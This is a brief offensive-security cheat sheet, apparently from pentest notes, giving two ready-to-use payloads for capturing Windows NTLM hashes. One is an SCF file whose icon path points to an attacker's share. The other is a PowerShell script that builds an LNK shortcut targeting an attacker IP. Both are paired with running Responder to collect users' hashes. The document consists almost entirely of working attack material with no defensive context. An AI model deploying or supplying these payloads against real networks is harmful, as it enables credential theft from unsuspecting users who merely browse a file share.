### SCF File

File is executed as soon as a user accesses the share. No longer works on Server 2019 hosts

Save as `@Inventory.scf

```
[Shell]
Command=2
IconFile=\\<your_ip>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

Start `responder` to capture the users hash

### LNK File:

User needs to click the file to open

```bash
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

Start `responder` to capture the users hash

